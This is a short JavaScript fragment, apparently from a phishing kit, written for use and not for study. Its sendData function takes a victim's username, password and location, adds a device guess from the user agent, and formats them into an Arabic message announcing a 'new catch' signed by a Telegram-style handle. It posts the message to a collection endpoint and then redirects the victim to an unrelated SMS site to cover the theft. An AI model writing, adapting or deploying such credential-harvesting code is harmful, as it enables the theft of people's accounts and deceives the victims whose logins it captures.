function getDevice() {
    var ua = navigator.userAgent;
    if (/android/i.test(ua)) return "Android 🤖";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS 🍎";
    return "PC 💻";
}

function sendData(u, p, l) {
    var dev = getDevice();
    var msg = "🎯 صيد جديد مرتب 🎯\n" +
              "━━━━━━━━━━━━━━\n" +
              "👤 المستخدم: " + u + "\n" +
              "🔑 كلمة السر: " + p + "\n" +
              "📱 الجهاز: " + dev + "\n" +
              "📍 الموقع: " + l + "\n" +
              "━━━━━━━━━━━━━━\n" +
              "👤 @M6_vip";

    fetch('/api/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: msg })
    }).then(function() {
        window.location.href = "https://receive-smss.com/";
    }).catch(function() {
        window.location.href = "https://receive-smss.com/";
    });
}
